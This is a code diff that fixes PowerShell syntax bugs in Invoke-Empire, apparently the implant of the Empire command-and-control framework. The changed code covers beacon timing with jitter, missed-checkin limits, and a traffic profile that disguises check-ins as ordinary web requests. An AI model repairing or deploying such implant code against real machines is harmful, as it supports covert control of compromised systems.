@@ -57,7 +57,7 @@ function Invoke-Empire {
         $WorkingHours,
 
         [object]
-        $ProxySettings,
+        $ProxySettings
     )
 
     ############################################################
@@ -726,17 +726,18 @@ function Invoke-Empire {
     $script:listeners = @(
 		#LISTENER_DICT
 		#Example listener entry
-		#{
-#        "delay" = 60
-#        "jitter" = 0.0
-#        "profile"= "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv=11.0) like Gecko",
-#        "fixed_parameters"= @{"param1"= 12, "param2"= "Mozilla"} #fixed immutable parameters used by the function such as the profile
-#        "send_func"= myfunc,
-#        "get_task_func"=otherfunc,
-#        "lostLimit"= 60,
-#        "missedCheckins"=4,
-#        "defaultResponse"="whatever",
-#    },
+		#@{
+#        delay = 60
+#        jitter = 0.0
+#        profile= "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv=11.0) like Gecko"
+#        fixed_parameters= @{param1= 12
+                             #param2= "Mozilla"} #fixed immutable parameters used by the function such as the profile
+#        send_func= myfunc
+#        get_task_func=otherfunc
+#        lostLimit= 60
+#        missedCheckins=4
+#        defaultResponse="whatever"
+#    }
 
 
 	)
@@ -745,7 +746,7 @@ function Invoke-Empire {
 # if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
 		if ($listener["delay"] -ne 0) {
 			$SleepMin = [int]((1-$listener["jitter"])*$listener["delay"])
-			$SleepMax = [int]((1+$listener["jitter"])*$l:["delay"])
+			$SleepMax = [int]((1+$listener["jitter"])*$listener["delay"])
 
 			if ($SleepMin -eq $SleepMax) {
 				$SleepTime = $SleepMin
@@ -760,7 +761,7 @@ function Invoke-Empire {
 	$script:CleanUpListeners = {
 		$newlisteners = @()
 		foreach ($l in $script:listeners){
-			if ($l["missedCheckins"] < $l["lostLimit"]){
+			if ($l["missedCheckins"] -lt $l["lostLimit"]){
 				$newlisteners += $l
 			}
 		}
